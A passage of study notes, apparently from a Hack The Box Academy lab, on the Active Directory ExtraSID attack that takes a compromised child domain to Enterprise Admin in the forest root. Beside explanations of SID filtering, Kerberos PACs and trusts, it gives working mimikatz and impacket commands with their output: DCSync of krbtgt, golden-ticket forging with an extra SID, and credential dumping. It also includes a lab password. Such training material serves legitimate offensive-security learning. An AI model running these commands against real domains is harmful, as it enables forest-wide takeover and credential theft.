+<div class="line-block">Intra-forest tree-root | Disabled | Possible |</div>
+<p>Example:</p>
+<pre><code>
+LOGISTICS → INLANEFREIGHT
+</code></pre>
+<h3 id="attack-fails">❌ Attack Fails</h3>
+<div class="line-block">Trust Type | SID Filtering |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">External domain trust | Enabled |</div>
+<div class="line-block">Forest trust | Enabled |</div>
+<div class="line-block">Cross-forest trust | Enabled |</div>
+<p>Example:</p>
+<pre><code>
+companyA.com → companyB.com
+</code></pre>
+<p>Here:</p>
+<pre><code>
+SID filtering = ON
+</code></pre>
+<p>So injected SIDs are removed.</p>
+<h3 id="where-sid-filtering-is-configured">7️⃣ Where SID Filtering Is Configured</h3>
+<p>On the <strong>trust relationship itself</strong>.</p>
+<p>Domain Controllers store trust settings in AD.</p>
+<p>Admin can view it using:</p>
+<pre><code>
+Active Directory Domains and Trusts
+</code></pre>
+<p>Or PowerShell.</p>
+<p>Example:</p>
+<pre><code>
+Get-ADTrust
+</code></pre>
+<p>Important attribute:</p>
+<pre><code>
+SIDFilteringForestAware
+</code></pre>
+<hr />
+<h3 id="what-happens-during-authentication-why-the-attack-works">8️⃣ What Happens During Authentication (Why the Attack Works)</h3>
+<p>When a parent DC receives authentication from a child domain:</p>
+<pre><code>
+Child domain authenticates user
+
+        │
+
+        ▼
+
+Kerberos ticket contains SIDs
+
+        │
+
+        ▼
+
+Parent domain builds access token
+</code></pre>
+<p>If SID filtering is disabled:</p>
+<pre><code>
+Parent DC keeps all SIDs
+</code></pre>
+<p>Example ticket:</p>
+<pre><code>
+User: hacker
+
+Domain: LOGISTICS
+
+SIDs:
+
+LOGISTICS\Domain Users
+
+INLANEFREIGHT\Enterprise Admins
+</code></pre>
+<p>Parent DC sees:</p>
+<pre><code>
+Enterprise Admin SID present
+</code></pre>
+<p>Result:</p>
+<pre><code>
+User treated as Enterprise Admin
+</code></pre>
+<hr />
+<h3 id="how-the-domain-controller-disables-sid-filtering">9️⃣ How the Domain Controller “Disables” SID Filtering</h3>
+<p>For <strong>parent-child trusts</strong>, AD sets it automatically.</p>
+<p>When the child domain is created:</p>
+<pre><code>
+TrustDirection = Bidirectional
+
+TrustType = ParentChild
+
+SIDFiltering = Disabled
+</code></pre>
+<p>Reason:</p>
+<pre><code>
+SIDHistory must work across forest domains
+</code></pre>
+<p>So AD allows <strong>foreign SIDs from trusted domains</strong>.</p>
+<h3 id="example">Example</h3>
+<h3 id="attack-goal">🎯 Attack Goal</h3>
+<p>Escalate privileges:</p>
+<pre><code>
+Child Domain → Parent Domain
+</code></pre>
+<p>By forging a <strong>Golden Ticket with ExtraSID</strong>.</p>
+<hr />
+<h3 id="attack-pathway-diagram">🧱 Attack Pathway Diagram</h3>
+<pre><code>
+ Active Directory Forest: INLANEFREIGHT.LOCAL
+
+                                ▲
+
+                                │
+
+              ┌────────────────┴────────────────┐
+
+              │                                 │
+
+     Child Domain (LOGISTICS)        Parent Domain (INLANEFREIGHT)
+
+              │                                 │
+
+      Compromised User Account           Enterprise Admin Group
+
+              │                                 ▲
+
+              └────────────── SID Injection ────┘
+
+                                 ExtraSID
+</code></pre>
+<hr />
+<h3 id="requirements">📌 Requirements</h3>
+<div class="line-block">Requirement | Purpose |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">Child domain KRBTGT hash | Sign forged ticket |</div>
+<div class="line-block">Child domain SID | Build ticket identity |</div>
+<div class="line-block">Child domain name | Kerberos realm |</div>
+<div class="line-block">Username | Identity inside TGT |</div>
+<div class="line-block">Parent Enterprise Admin SID | ExtraSID privilege escalation |</div>
+<h3 id="step-1-dump-krbtgt-hash-child-domain">🧪 Step 1 — Dump KRBTGT Hash (Child Domain)</h3>
+<pre><code>
+mimikatz
+
+lsadump::dcsync/user:LOGISTICS\krbtgt
+</code></pre>
+<p>Purpose:</p>
+<pre><code>
+Retrieve KRBTGT secret key
+</code></pre>
+<p>Example output:</p>
+<pre><code>
+Hash NTLM: 9d765b482771505cbe97411065964d5f
+</code></pre>
+<p>This key is used to <strong>sign forged Kerberos tickets</strong>.</p>
+<h3 id="step-2-get-child-domain-sid">🧪 Step 2 — Get Child Domain SID</h3>
+<pre><code>
+Get-DomainSID
+</code></pre>
+<p>Output:</p>
+<pre><code>
+S-1-5-21-2806153819-209893948-922872689
+</code></pre>
+<p>This builds the <strong>user SID in the forged ticket</strong>.</p>
+<hr />
+<h3 id="step-3-get-parent-enterprise-admin-sid">🧪 Step 3 — Get Parent Enterprise Admin SID</h3>
+<pre><code>
+Get-DomainGroup-Domain INLANEFREIGHT.LOCAL -Identity &quot;Enterprise Admins&quot;
+</code></pre>
+<p>Output:</p>
+<pre><code>
+S-1-5-21-3842939050-3880317879-2865463114-519
+</code></pre>
+<p>Important part:</p>
+<pre><code>
+RID 519 = Enterprise Admins
+</code></pre>
+<p>This SID will be injected.</p>
+<hr />
+<h3 id="step-4-confirm-no-access">🛑 Step 4 — Confirm No Access</h3>
+<pre><code>
+ls \\academy-ea-dc01.inlanefreight.local\c$
+</code></pre>
+<p>Output:</p>
+<pre><code>
+Access is denied
+</code></pre>
+<p>Attacker has <strong>no parent domain privileges yet</strong>.</p>
+<hr />
+<h3 id="step-5-forge-golden-ticket-with-extrasid">🎟️ Step 5 — Forge Golden Ticket with ExtraSID</h3>
+<pre><code>
+mimikatz
+
+kerberos::golden
+
+/user:hacker
+
+/domain:LOGISTICS.INLANEFREIGHT.LOCAL
+
+/sid:S-1-5-21-2806153819-209893948-922872689
+
+/krbtgt:9d765b482771505cbe97411065964d5f
+
+/sids:S-1-5-21-3842939050-3880317879-2865463114-519
+
+/ptt
+</code></pre>
+<h3 id="what-this-command-actually-does">🔍 What This Command Actually Does</h3>
+<p>Creates a <strong>forged TGT containing</strong>:</p>
+<pre><code>
+User: hacker
+
+Domain: LOGISTICS
+
+Primary SID: Child domain SID
+
+ExtraSID: Enterprise Admins (Parent)
+</code></pre>
+<p>Kerberos ticket now contains:</p>
+<pre><code>
+User SID
+
++
+
+Enterprise Admin SID
+</code></pre>
+<p>So when authentication occurs:</p>
+<pre><code>
+Authorization token includes Enterprise Admin
+</code></pre>
+<hr />
+<h3 id="step-6-verify-ticket">📄 Step 6 — Verify Ticket</h3>
+<pre><code>
+klist
+</code></pre>
+<p>Output:</p>
+<pre><code>
+Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
+
+Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL
+</code></pre>
+<p>Ticket is now <strong>in memory</strong>.</p>
+<hr />
+<h3 id="step-7-access-parent-domain-dc">🗂️ Step 7 — Access Parent Domain DC</h3>
+<pre><code>
+ls \\academy-ea-dc01.inlanefreight.local\c$
+</code></pre>
+<p>Now access works.</p>
+<p>Why?</p>
+<p>Because the <strong>authorization token contains Enterprise Admin SID</strong>.</p>
+<hr />
+<h3 id="step-8-confirm-privilege-with-dcsync">📤 Step 8 — Confirm Privilege with DCSync</h3>
+<pre><code>
+mimikatz
+
+lsadump::dcsync/user:INLANEFREIGHT\lab_adm
+</code></pre>
+<p>Output:</p>
+<pre><code>
+NTLM Hash: 663715a1a8b957e8e9943cc98ea451b6
+</code></pre>
+<p>This proves:</p>
+<pre><code>
+Attacker = Enterprise Admin
+</code></pre>
+<h3 id="example---2">Example - 2</h3>
+<h3 id="forest-setup">🌳 Forest Setup</h3>
+<p>Example forest:</p>
+<pre><code>
+INLANEFREIGHT.LOCAL (Parent / Root Domain)
+
+│
+
+├── LOGISTICS.INLANEFREIGHT.LOCAL (Child Domain)
+
+│
+
+└── HR.INLANEFREIGHT.LOCAL (Child Domain)
+</code></pre>
+<p>Trust properties:</p>
+<pre><code>
+✔ Two-way
+
+✔ Transitive
+
+✔ Automatic
+
+✔ SID Filtering Disabled (intra-forest)
+</code></pre>
+<p>Meaning:</p>
+<pre><code>
+Parent domain accepts SIDs coming from child domains
+</code></pre>
+<hr />
+<h3 id="attacker-position">🔑 Attacker Position</h3>
+<p>Attacker compromised <strong>child domain</strong>:</p>
+<pre><code>
+LOGISTICS.INLANEFREIGHT.LOCAL
+</code></pre>
+<p>Attacker obtains:</p>
+<pre><code>
+Child Domain SID
+
+Child KRBTGT Hash
+</code></pre>
+<p>Now attacker can <strong>forge Kerberos TGTs</strong>.</p>
+<hr />
+<h3 id="forged-golden-ticket-structure">🎟 Forged Golden Ticket Structure</h3>
+<p>Example forged ticket:</p>
+<pre><code>
+User: hacker
+
+Domain: LOGISTICS.INLANEFREIGHT.LOCAL
+
+Primary SID
+
+S-1-5-21-LOGISTICS-1105
+
+ExtraSID
+
+S-1-5-21-INLANEFREIGHT-519
+</code></pre>
+<p>Where:</p>
+<pre><code>
+519 = Enterprise Admin
+</code></pre>
+<p>So the ticket claims:</p>
+<pre><code>
+&quot;hacker&quot; ∈ Enterprise Admins
+</code></pre>
+<hr />
+<h3 id="scenario-1-existing-user">🔎 Scenario 1 — Existing User</h3>
+<p>User exists in child domain.</p>
+<p>Example:</p>
+<pre><code>
+LOGISTICS\john
+</code></pre>
+<p>Attack flow:</p>
+<pre><code>
+Attacker
+
+   │
+
+   │ Forge TGT for john
+
+   │ Add ExtraSID (Enterprise Admin)
+
+   ▼
+
+Golden Ticket
+</code></pre>
+<p>Ticket content:</p>
+<pre><code>
+User: john
+
+SID: LOGISTICS-1105
+
+ExtraSID: INLANEFREIGHT-519
+</code></pre>
+<p>Now authentication flow:</p>
+<pre><code>
+john → Parent DC
+
+      requests TGS
+</code></pre>
+<p>DC logic:</p>
+<pre><code>
+✔ Ticket signature valid
+
+✔ Issued by trusted domain
+
+✔ SID filtering disabled
+</code></pre>
+<p>Resulting token:</p>
+<pre><code>
+User: LOGISTICS\john
+
+Groups:
+
+LOGISTICS\Domain Users
+
+INLANEFREIGHT\Enterprise Admins
+</code></pre>
+<p>Result:</p>
+<pre><code>
+john becomes Enterprise Admin in parent domain
+</code></pre>
+<h3 id="scenario-2-non-existing-user">🔎 Scenario 2 — Non-Existing User</h3>
+<p>This is the interesting one.</p>
+<p>Attacker creates <strong>fake identity</strong>.</p>
+<pre><code>
+User: hacker123
+</code></pre>
+<p>This user <strong>does NOT exist in AD</strong>.</p>
+<p>Forged ticket:</p>
+<pre><code>
+User: hacker123
+
+Domain: LOGISTICS
+
+Primary SID
+
+S-1-5-21-LOGISTICS-5000
+
+ExtraSID
+
+S-1-5-21-INLANEFREIGHT-519
+</code></pre>
+<p>Signed with:</p>
+<pre><code>
+KRBTGT hash of LOGISTICS
+</code></pre>
+<hr />
+<h3 id="why-this-still-works">🧠 Why This Still Works</h3>
+<p>Because <strong>Kerberos trusts the ticket, not the user object</strong>.</p>
+<p>The authentication stage was already “completed”.</p>
+<p>Golden Ticket <strong>skips the AS-REQ stage</strong>.</p>
+<p>Normal Kerberos flow:</p>
+<pre><code>
+AS-REQ  → Authentication
+
+TGS-REQ → Authorization
+</code></pre>
+<p>Golden Ticket starts directly at:</p>
+<pre><code>
+TGS-REQ
+</code></pre>
+<hr />
+<h3 id="actual-authentication-flow">🔄 Actual Authentication Flow</h3>
+<p>Attacker accesses resource on parent domain:</p>
+<pre><code>
+\\DC01.INLANEFREIGHT.LOCAL\C$
+</code></pre>
+<p>Kerberos interaction:</p>
+<pre><code>
+Attacker
+
+   │
+
+   │ Present forged TGT
+
+   ▼
+
+Parent Domain Controller
+</code></pre>
+<p>DC verification:</p>
+<pre><code>
+✔ Ticket signature valid
+
+✔ Ticket issued by trusted child domain
+
+✔ Ticket lifetime valid
+</code></pre>
+<p>The DC <strong>does NOT do this check</strong>:</p>
+<pre><code>
+❌ Does user &quot;hacker123&quot; exist?
+</code></pre>
+<p>Because it assumes:</p>
+<pre><code>
+Authentication already happened in child domain
+</code></pre>
+<hr />
+<h3 id="token-creation-inside-parent-dc">⚙️ Token Creation Inside Parent DC</h3>
+<p>The DC reads <strong>authorization data inside ticket</strong>.</p>
+<pre><code>
+Primary SID → LOGISTICS-5000
+
+Extra SID   → INLANEFREIGHT-519
+</code></pre>
+<p>Token generated:</p>
+<pre><code>
+User: LOGISTICS\hacker123
+
+Groups:
+
+INLANEFREIGHT\Enterprise Admins
+</code></pre>
+<p>Authorization decision:</p>
+<pre><code>
+if token contains Enterprise Admin SID
+
+      allow privileged access
+</code></pre>
+<p>Result:</p>
+<pre><code>
+Access granted
+</code></pre>
+<hr />
+<h3 id="resource-access-example">🔓 Resource Access Example</h3>
+<p>Attacker connects to:</p>
+<pre><code>
+\\DC01.INLANEFREIGHT.LOCAL\C$
+</code></pre>
+<p>Server receives token:</p>
+<pre><code>
+LOGISTICS\hacker123
+
+Enterprise Admin
+</code></pre>
+<p>Access check:</p>
+<pre><code>
+Enterprise Admin → Full privileges
+</code></pre>
+<p>Result:</p>
+<pre><code>
+Attacker controls parent domain
+</code></pre>
+<hr />
+<h3 id="why-child-domain-can-escalate-to-parent">🔗 Why Child Domain Can Escalate to Parent</h3>
+<p>Because of <strong>trust relationship</strong>.</p>
+<p>Trust rule:</p>
+<pre><code>
+Parent trusts authentication from child domain
+</code></pre>
+<p>So when the ticket says:</p>
+<pre><code>
+Issued by LOGISTICS KDC
+</code></pre>
+<p>Parent assumes:</p>
+<pre><code>
+LOGISTICS domain already verified this user
+</code></pre>
+<p>And since <strong>SID filtering is disabled</strong>:</p>
+<pre><code>
+ExtraSID is preserved
+</code></pre>
+<p>So parent accepts:</p>
+<pre><code>
+Enterprise Admin SID
+</code></pre>
+<h3 id="example---3">Example - 3</h3>
+<h3 id="extra-sid-attack-is-usually-used-for">Extra SID Attack Is Usually Used For</h3>
+<p><strong>1. Forest Privilege Escalation ⭐</strong></p>
+<p>Most common use case.</p>
+<pre><code>
+Child Domain Compromised
+
+        ↓
+
+Get Child KRBTGT
+
+        ↓
+
+Forge Ticket
+
+        ↓
+
+Add Parent EA SID in ExtraSIDs
+
+        ↓
+
+Become Enterprise Admin
+</code></pre>
+<p>This is where Extra SID attacks became famous.</p>
+<hr />
+<h4 id="trust-abuse">2. Trust Abuse</h4>
+<p>Suppose:</p>
+<pre><code>
+child.corp.local
+
+       ↔
+
+corp.local
+</code></pre>
+<p>Attacker controls:</p>
+<pre><code>
+child.corp.local
+</code></pre>
+<p>Extra SID allows:</p>
+<pre><code>
+Child User
+
+     ↓
+
+PAC contains
+
+Enterprise Admin SID
+
+     ↓
+
+Parent Domain Trusts SID
+
+     ↓
+
+Escalation
+</code></pre>
+<hr />
+<h4 id="chained-after-dcsync">3. Chained After DCSync</h4>
+<p>Common HTB chain:</p>
+<pre><code>
+Low User
+
+   ↓
+
+Kerberoast
+
+   ↓
+
+DA
+
+   ↓
+
+DCSync
+
+   ↓
+
+KRBTGT
+
+   ↓
+
+Golden Ticket
+
+   ↓
+
+Extra SID Attack
+
+   ↓
+
+Enterprise Admin
+</code></pre>
+<hr />
+<h3 id="common-chains">Common Chains</h3>
+<p><strong>Chain 1 - Child → Forest Root</strong></p>
+<p>Classic exam scenario.</p>
+<pre><code>
+Compromise Child Domain
+
+      ↓
+
+DCSync Child KRBTGT
+
+      ↓
+
+Extra SID Attack
+
+      ↓
+
+Add Root Enterprise Admin SID
+
+      ↓
+
+Forest Compromise
+</code></pre>
+<hr />
+<p><strong>Chain 2 - Golden Ticket + Extra SID</strong></p>
+<pre><code>
+KRBTGT Hash
+
+      ↓
+
+Forge Golden Ticket
+
+      ↓
+
+Insert Extra SID
+
+      ↓
+
+Cross Domain Privilege Escalation
+</code></pre>
+<p>The Extra SID is simply another field inside the forged PAC.</p>
+<hr />
+<p><strong>Chain 3 - Diamond Ticket + Extra SID</strong></p>
+<pre><code>
+Legitimate TGT
+
+      ↓
+
+Modify PAC
+
+      ↓
+
+Add Enterprise Admin SID
+
+      ↓
+
+Re-sign PAC
+</code></pre>
+<p>Same idea.</p>
+<h3 id="golden-ticket-extra-sid-poc---windows">Golden Ticket + Extra SID PoC - Windows</h3>
+<p><strong>Step 1 - rdp to windows machine</strong></p>
+<p>xfreerdp /u:htb-student_adm /p:‘HTB_<span class="citation" data-cites="cademy_stdnt_admin">@cademy_stdnt_admin</span>!’ /v:10.129.232.164 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution</p>
+<p><strong>Step 2 - run mimikatz to get the ntml hash of krbtgt</strong></p>
+<p>..exe # lsadump::dcsync /user:LOGISTICS</p>
+<p>Credentials:</p>
+<p>Hash NTLM: 9d765b482771505cbe97411065964d5f</p>
+<p>ntlm- 0: 9d765b482771505cbe97411065964d5f</p>
+<p>lm - 0: 69df324191d4a80f0ed100c10f20561e</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><strong>Step 3 - getting the sid of child domain</strong></p>
+<p>S-1-5-21-2806153819-209893948-922872689</p>
+<p><strong>Step 4 - getting the sid of Enterprise Admins</strong></p>
+<p>S-1-5-21-3842939050-3880317879-2865463114-519</p>
+<p><strong>At this point, we have gathered the following data points:</strong></p>
+<ul>
+<li><p>The KRBTGT hash for the child domain: <code>9d765b482771505cbe97411065964d5f</code></p></li>
+<li><p>The SID for the child domain: <code>S-1-5-21-2806153819-209893948-922872689</code></p></li>
+<li><p>The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We’ll choose a fake user: <code>hacker</code></p></li>
+<li><p>The FQDN of the child domain: <code>LOGISTICS.INLANEFREIGHT.LOCAL</code></p></li>
+<li><p>The SID of the Enterprise Admins group of the root domain: <code>S-1-5-21-3842939050-3880317879-2865463114-519</code></p></li>
+</ul>
+<p><strong>Step 5 - run mimikatz</strong></p>
+<p>..exe</p>
+<p>kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><strong>Step 6 - list the content on C: drive and read the flag file</strong></p>
+<p>ls \academy-ea-dc01.inlanefreight.local$</p>
+<p>type “\academy-ea-dc01.inlanefreight.local$.txt</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<h3 id="golden-ticket-extra-sid-poc---linux">Golden Ticket + Extra SID PoC - Linux</h3>
+<p><strong>Step 1 - ssh to linux machine</strong></p>
+<p><strong>Step 2- get the hash of krbtgt</strong></p>
+<p><a href="http://secretsdump.py/" target="_blank" rel="noopener noreferrer">secretsdump.py</a> logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</p>
+<p>password - HTB_<span class="citation" data-cites="cademy_stdnt_admin">@cademy_stdnt_admin</span>!</p>
+<p>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><strong>Step 3 - grab the sid of domain</strong></p>
+<p><a href="http://lookupsid.py/" target="_blank" rel="noopener noreferrer">lookupsid.py</a> logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep “Domain SID”</p>
+<p>S-1-5-21-2806153819-209893948-922872689</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><strong>Step 4 - get the sid of enterprise admin</strong></p>
+<p><a href="http://lookupsid.py/" target="_blank" rel="noopener noreferrer">lookupsid.py</a> logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 “Enterprise Admins”</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><strong>Step 5 - perform the attack using <a href="http://ticketer.py" target="_blank" rel="noopener noreferrer">ticketer.py</a> tool</strong></p>
+<p><a href="http://ticketer.py/" target="_blank" rel="noopener noreferrer">ticketer.py</a> -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p><strong>Step 6 - run secretsdump to get the hash of user bross</strong></p>
+<p>impacket-secretsdump -just-dc-user bross -just-dc-ntlm LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<h2 id="extra-sid-attack">Extra Sid Attack</h2>
+<h3 id="understanding-the-core-concept">Understanding The Core Concept</h3>
+<h3 id="big-picture-first-one-sentence">🧠 Big Picture First (One Sentence)</h3>
+<blockquote>
+<p>This attack works because Kerberos trusts the PAC issued by a trusted domain, and Windows authorization blindly honors ExtraSIDs (SIDHistory) when SID filtering is not enforced inside a forest.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p>Everything else is mechanics.</p>
+<h3 id="requirements-1">📌 <strong>Requirements:</strong></h3>
+<div class="line-block">Requirement | Purpose |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">KRBTGT NTLM hash (child) | Create Golden Ticket |</div>
+<div class="line-block">Child domain SID | Needed to build the ticket |</div>
+<div class="line-block">FQDN of child domain | Domain name of forged ticket |</div>
+<div class="line-block">Username (can be fake) | Username inside forged TGT |</div>
+<div class="line-block">Parent Domain Enterprise Admins SID | Added as ExtraSID (grants full forest access) |</div>
+<h3 id="prerequisites-for-sid-history-extrasid-child-parent-attack">✅ <strong>Prerequisites for SID History / ExtraSID (Child → Parent) Attack</strong></h3>
+<h3 id="child-domain-must-be-compromised-critical">1️⃣ <strong>Child Domain Must Be Compromised (Critical)</strong></h3>
+<p>You must already have <strong>high privilege in the child domain</strong>.</p>
+<p><strong>Required capability:</strong></p>
+<ul>
+<li>Ability to <strong>DCSync the child domain</strong></li>
+</ul>
+<p>This usually means:</p>
+<ul>
+<li><p>Domain Admin <strong>OR</strong></p></li>
+<li><p>Equivalent replication privileges</p></li>
+</ul>
+<p>👉 Without child-domain compromise, the attack is impossible.</p>
+<hr />
+<h3 id="child-domain-krbtgt-hash">2️⃣ <strong>Child Domain KRBTGT Hash</strong></h3>
+<p><strong>Why it is required:</strong></p>
+<ul>
+<li><p>Used to <strong>cryptographically sign</strong> the forged Golden Ticket</p></li>
+<li><p>Parent domain trusts tickets signed by child KRBTGT (due to forest trust)</p></li>
+</ul>
+<p><strong>How it’s obtained:</strong></p>
+<ul>
+<li>DCSync against <code>krbtgt</code> in child domain</li>
+</ul>
+<p>👉 <strong>This is the core cryptographic requirement.</strong></p>
+<hr />
+<h3 id="intra-forest-trust-relationship">3️⃣ <strong>Intra-Forest Trust Relationship</strong></h3>
+<p>The child and parent must be in the <strong>same Active Directory forest</strong>.</p>
+<p><strong>Required trust properties:</strong></p>
+<ul>
+<li><p>Transitive</p></li>
+<li><p>Bidirectional</p></li>
+<li><p>Automatic (default inside forest)</p></li>
+</ul>
+<p><strong>Why:</strong></p>
+<ul>
+<li>Parent domain <strong>accepts Kerberos tickets</strong> issued by child domain</li>
+</ul>
+<p>❌ External trust alone is <strong>not sufficient</strong>.</p>
+<hr />
+<h3 id="sid-filtering-must-be-disabled-default-in-forest">4️⃣ <strong>SID Filtering Must Be Disabled (Default in Forest)</strong></h3>
+<p><strong>Why:</strong></p>
+<ul>
+<li><p>SID filtering removes foreign high-privilege SIDs</p></li>
+<li><p>Inside a forest, <strong>SID filtering is disabled by default</strong></p></li>
+</ul>
+<p><strong>Effect:</strong></p>
+<ul>
+<li><strong>ExtraSID (Enterprise Admin SID)</strong> is accepted without validation</li>
+</ul>
+<p>👉 This is the <strong>authorization flaw</strong> being abused.</p>
+<hr />
+<h3 id="child-domain-sid">5️⃣ <strong>Child Domain SID</strong></h3>
+<p><strong>Purpose:</strong></p>
+<ul>
+<li><p>Required to construct a <strong>valid child-domain identity</strong></p></li>
+<li><p>Used as the base SID of the forged ticket</p></li>
+</ul>
+<p>Without this:</p>
+<ul>
+<li>Ticket structure is invalid</li>
+</ul>
+<hr />
+<h3 id="parent-domain-enterprise-admin-sid">6️⃣ <strong>Parent Domain Enterprise Admin SID</strong></h3>
+<p><strong>Purpose:</strong></p>
+<ul>
+<li><p>Injected as <strong>ExtraSID</strong> into the Kerberos PAC</p></li>
+<li><p>Grants forest-wide administrative privileges</p></li>
+</ul>
+<p><strong>Important:</strong></p>
+<ul>
+<li><p>Only the <strong>SID value</strong> is required</p></li>
+<li><p>No group membership or AD modification needed</p></li>
+</ul>
+<hr />
+<h3 id="any-username-existing-or-fake">7️⃣ <strong>Any Username (Existing or Fake)</strong></h3>
+<p><strong>Important clarification:</strong></p>
+<ul>
+<li><p><strong>User does NOT need to exist</strong></p></li>
+<li><p>Kerberos does <strong>not verify user existence</strong> for a signed TGT</p></li>
+</ul>
+<p><strong>Why this works:</strong></p>
+<ul>
+<li>Authorization is SID-based, not object-based</li>
+</ul>
+<h3 id="what-is-actually-being-abused-here">1️⃣ What Is <em>Actually</em> Being Abused Here?</h3>
+<p>This is <strong>NOT</strong> a vulnerability in:</p>
+<ul>
+<li><p>Mimikatz</p></li>
+<li><p>Kerberos crypto</p></li>
+<li><p>NTLM hashes</p></li>
+</ul>
+<p>This is an abuse of:</p>
+<div class="line-block">Component | What’s abused |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>SIDHistory</strong> | SIDs are trusted without origin validation |</div>
+<div class="line-block"><strong>Kerberos PAC</strong> | Contains authorization data, not validated cross-domain |</div>
+<div class="line-block"><strong>Intra-forest trust</strong> | SID filtering disabled by default |</div>
+<div class="line-block"><strong>Authorization model</strong> | Token-based, SID-based |</div>
+<hr />
+<h3 id="sidhistory-vs-extrasid-critical-clarification">2️⃣ SIDHistory vs ExtraSID (Critical Clarification)</h3>
+<h3 id="important-distinction">Important distinction:</h3>
+<div class="line-block">Term | Where it lives |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>sidHistory attribute</strong> | Stored in AD user object |</div>
+<div class="line-block"><strong>ExtraSID</strong> | Lives inside Kerberos PAC |</div>
+<p>⚠️ <strong>Golden Ticket does NOT modify AD objects</strong></p>
+<p>It <strong>injects SIDHistory logically</strong>, not physically.</p>
+<p>👉 ExtraSID in a forged ticket <strong>behaves exactly like sidHistory</strong> during authorization.</p>
+<hr />
+<h3 id="why-trust-is-the-core-requirement">3️⃣ Why Trust Is the Core Requirement</h3>
+<p><strong>🔗 Intra-Forest Trust Model</strong></p>
+<p>Inside a forest:</p>
+<pre><code>
+ChildDomain  ───(Transitive Trust)───&gt;  ParentDomain
+</code></pre>
+<p>Key properties:</p>
+<ul>
+<li><p>Trust is <strong>automatic</strong></p></li>
+<li><p>Trust is <strong>bidirectional</strong></p></li>
+<li><p>Trust is <strong>transitive</strong></p></li>
+<li><p><strong>SID Filtering = DISABLED</strong></p></li>
+</ul>
+<p>💥 This last point is why the attack works.</p>
+<hr />
+<h3 id="why-sid-filtering-is-disabled">🔍 Why SID Filtering Is Disabled</h3>
+<p>SID filtering is disabled <strong>by design</strong> to support:</p>
+<ul>
+<li><p>Account migrations</p></li>
+<li><p>SIDHistory usage</p></li>
+<li><p>Legacy access preservation</p></li>
+</ul>
+<p>Microsoft assumed:</p>
+<blockquote>
+<p>“Only trusted admins exist inside a forest”</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p>This assumption fails once a <strong>child domain is compromised</strong>.</p>
+<hr />
+<h3 id="where-the-attack-lives-in-kerberos-very-important">4️⃣ Where the Attack Lives in Kerberos (Very Important)</h3>
+<p>This attack abuses <strong>authorization</strong>, not authentication.</p>
+<h3 id="kerberos-phases">Kerberos phases:</h3>
+<ol type="1">
+<li><p><strong>Authentication</strong></p></li>
+<li><p><strong>Authorization</strong></p></li>
+</ol>
+<p>This attack happens <strong>after authentication succeeds</strong>.</p>
+<hr />
+<h3 id="kerberos-ticket-internals-pac-explained-simply">5️⃣ Kerberos Ticket Internals (PAC Explained Simply)</h3>
+<p>Every TGT contains a <strong>PAC (Privilege Attribute Certificate)</strong>.</p>
+<p>PAC contains:</p>
+<ul>
+<li><p>User SID</p></li>
+<li><p>Group SIDs</p></li>
+<li><p><strong>ExtraSIDs (SIDHistory)</strong></p></li>
+<li><p>Privileges</p></li>
+<li><p>Domain info</p></li>
+</ul>
+<p>When you forge a Golden Ticket, you control:</p>
+<pre><code>
+PAC → AuthorizationIdentity
+</code></pre>
+<p>The KDC does <strong>not re-validate PAC contents</strong> for trusted domains.</p>
+<hr />
+<h3 id="why-the-child-krbtgt-hash-is-enough">6️⃣ Why the Child KRBTGT Hash Is Enough</h3>
+<p><strong>Key misunderstanding people have:</strong></p>
+<blockquote>
+<p>“Why does child KRBTGT allow parent access?”</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<p>Because:</p>
+<ul>
+<li><p>The <strong>parent domain trusts tickets signed by the child</strong></p></li>
+<li><p>Signature validation ≠ authorization validation</p></li>
+</ul>
+<p>Flow:</p>
+<pre><code>
+Parent DC:
+
+✔ Signaturevalid(child krbtgt)
+
+✔ Domain trusted
+
+❌ Does NOT validate ExtraSID origin
+</code></pre>
+<p>👉 Ticket accepted.</p>
+<h3 id="example-1">Example</h3>
+<h3 id="step-by-step-what-logically-happens-during-the-attack">7️⃣ Step-by-Step: What <em>Logically</em> Happens During the Attack</h3>
+<p>Let’s walk it <strong>exactly as Windows sees it</strong>.</p>
+<hr />
+<p><strong>🧩 Step 1: Child Domain Is Compromised</strong></p>
+<p>Attacker already has:</p>
+<ul>
+<li><p>DCSync rights in child</p></li>
